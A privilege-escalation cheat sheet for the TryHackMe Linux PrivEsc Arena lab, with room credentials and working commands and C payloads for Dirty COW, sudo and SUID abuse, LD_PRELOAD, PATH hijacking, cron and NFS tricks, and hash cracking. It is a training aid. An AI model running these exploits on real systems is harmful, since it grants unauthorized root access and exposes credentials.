# THM Linux PrivEsc Arena Cheat Sheet
Based on the TryHackMe Linux PrivEsc Arena walkthrough flow

Room basics:

- SSH is open on port 22
- Credentials: `TCM:Hacker123`
- Useful tools are in `/home/user/tools`

---

# 0. Connect and Baseline

## Connect from Kali

```bash
ssh TCM@TARGET_IP
# password: Hacker123
```

## Quick local baseline

```bash
whoami
id
hostname
uname -a
sudo -l
find / -type f -perm -04000 -ls 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
cat /etc/exports
```

---

# 1. Kernel Exploits (Dirty COW)

## Detection

```bash
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
uname -a
```

## Exploitation

```bash
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
./c0w
passwd
id
```

## Cleanup

```bash
cp /tmp/passwd.bak /usr/bin/passwd
```

---

# 2. Stored Passwords (Config Files)

## Hunt config files

```bash
ls -la /home/user
cat /home/user/myvpn.ovpn
cat /etc/openvpn/auth.txt
cat /home/user/.irssi/config | grep -i passw
```

## Typical follow-up

```bash
su root
# or
ssh user@TARGET_IP
```

---

# 3. Stored Passwords (History)

## Check shell history

```bash
cat ~/.bash_history | grep -i passw
cat ~/.bash_history
history
```

## Reuse discovered credentials

```bash
su root
# or
su anotheruser
# or
ssh anotheruser@TARGET_IP
```

---

# 4. Weak File Permissions (/etc/shadow readable)

## Detection

```bash
ls -la /etc/shadow
cat /etc/passwd
cat /etc/shadow
```

## Copy hashes to attacker box and crack

### On target
```bash
cat /etc/passwd
cat /etc/shadow
```

### On Kali
```bash
unshadow passwd shadow > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt -O
# or
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

## Reuse recovered password

```bash
su root
```

## If /etc/shadow is writable

Generate a new password hash with a password of your choice:

```
mkpasswd -m sha-512 newpasswordhere
```

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated. Switch to the root user

## If /etc/passwd is writable
Generate a new password hash with a password of your choice:

```
openssl passwd newpasswordhere
```

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x"). Then, switch to root user.

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

```
su newroot
```

Or, simply delete X to log in passwordless.

---

# 5. SSH Keys

## Detection

```bash
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
```

## Exploitation

### On target
```bash
cat /path/to/id_rsa
```

### On Kali
```bash
chmod 600 id_rsa
ssh -i id_rsa root@TARGET_IP
```

---

# 6. Sudo (Shell Escaping)

## Detection

```bash
sudo -l
```

## Exploitation options

```bash
sudo find /bin -name nano -exec /bin/sh \;
```

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

```bash
echo "os.execute('/bin/sh')" > shell.nse
sudo nmap --script=shell.nse
```

```bash
sudo vim -c '!sh'
```

## Verify

```bash
id
whoami
```

---

# 7. Sudo (Abusing Intended Functionality)

## Detection

```bash
sudo -l
```

## Read root hash via apache2

```bash
sudo apache2 -f /etc/shadow
```

## Crack the hash on Kali

```bash
echo '[PASTE_ROOT_HASH]' > hash.txt
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
```

## Reuse password

```bash
su root
```

---

# 8. Sudo (LD_PRELOAD)

## Detection

```bash
sudo -l
```

Look for `LD_PRELOAD` preserved.

## Build malicious shared object

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Save as `x.c`.

## Compile and exploit

```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
id
```

Create a shared object using the code above and run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object.

---

# 9. SUID (Shared Object Injection)

## Detection

```bash
find / -type f -perm -04000 -ls 2>/dev/null
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

## Exploitation

```bash
mkdir /home/user/.config
cd /home/user/.config
```

Create `libcalc.c`:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Compile and run:

```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
id
```

---

# 10. SUID (Symlinks / Nginx)

## Detection

```bash
dpkg -l | grep nginx
```

## Exploitation flow used in the room

### Terminal 1
```bash
su root
# password: password123
su -l www-data
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
```

### Terminal 2
```bash
su root
# password: password123
invoke-rc.d nginx rotate >/dev/null 2>&1
```

### Back to Terminal 1
```bash
id
```

---

# 11. SUID (Environment Variables #1 / PATH Hijack)

If a privileged script or program calls commands without full paths, you can hijack them.

## Detection

```bash
find / -type f -perm -04000 -ls 2>/dev/null
strings /usr/local/bin/suid-env
```

## Exploitation

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
id
```

---

# 12. SUID (Environment Variables #2)

In Bash versions <4.2-048, it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

## Detection

```bash
find / -type f -perm -04000 -ls 2>/dev/null
strings /usr/local/bin/suid-env2
```

## Exploitation Method #1

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

## Exploitation Method #2

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

## Verify

```bash
id
```

---

# 13. Capabilities

## Detection

```bash
getcap -r / 2>/dev/null
```

## Exploitation

```bash
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
```

---

# 14. Cron (PATH Abuse)

If a cron job does not run with a full path.

## Detection

```bash
cat /etc/crontab
echo $PATH
```

You may place a malicious script earlier in $PATH.

## Exploitation

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```

Wait about a minute, then:

```bash
/tmp/bash -p
id
```

---

# 15. Cron (Wildcards / tar)

## Detection

```bash
cat /etc/crontab
cat /usr/local/bin/compress.sh
```

## Exploitation

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

Wait about a minute, then:

```bash
/tmp/bash -p
id
```

---

# 16. Cron (Writable Script / File Overwrite)

Writable scripts executed by root.

## Detection

```bash
cat /etc/crontab
ls -l /usr/local/bin/overwrite.sh
```

## Exploitation

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```

Wait about a minute, then:

```bash
/tmp/bash -p
id
```

---

# 17. NFS Root Squashing (no_root_squash)

## Detection on target

```bash
cat /etc/exports
```

## Exploitation on Kali

```bash
showmount -e TARGET_IP
mkdir /tmp/1
sudo mount -o rw TARGET_IP:/tmp /tmp/1
sudo mount -o rw,vers=2 TARGET_IP:/tmp /tmp/1
```

Create payload source:

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
```

Compile and SUID it:

```bash
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x
```

## Trigger on target

```bash
/tmp/x
id
```

---

# 18. Quick Reusable Commands

## SUID and capabilities

```bash
find / -type f -perm -04000 -ls 2>/dev/null
getcap -r / 2>/dev/null
```

## Sudo

```bash
sudo -l
sudo -V
```

## Password hunting

```bash
grep -Rni "pass" /home 2>/dev/null
grep -Rni "pass" /etc 2>/dev/null
cat ~/.bash_history
history
```

## SSH keys

```bash
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

## Cron

```bash
cat /etc/crontab
ls -la /etc/cron*
```

## NFS

```bash
cat /etc/exports
showmount -e TARGET_IP
```

---

# 19. Minimal Exam-Style Decision Tree

## Step 1: enumerate
```bash
id
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
ps aux
getcap -r / 2>/dev/null
uname -a
ls -la /etc/passwd
cat /etc/exports
```

## Step 2: hunt creds
```bash
cat ~/.bash_history
grep -Rni "pass" /home 2>/dev/null
find / -name id_rsa 2>/dev/null
```

## Step 3: abuse sudo or SUID first
```bash
sudo -l
strings /usr/local/bin/suid-env
strings /usr/local/bin/suid-env2
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

## Step 4: check scheduled tasks and NFS
```bash
cat /etc/crontab
cat /usr/local/bin/compress.sh
ls -l /usr/local/bin/overwrite.sh
cat /etc/exports
```

## Step 5: verify root
```bash
id
whoami
```
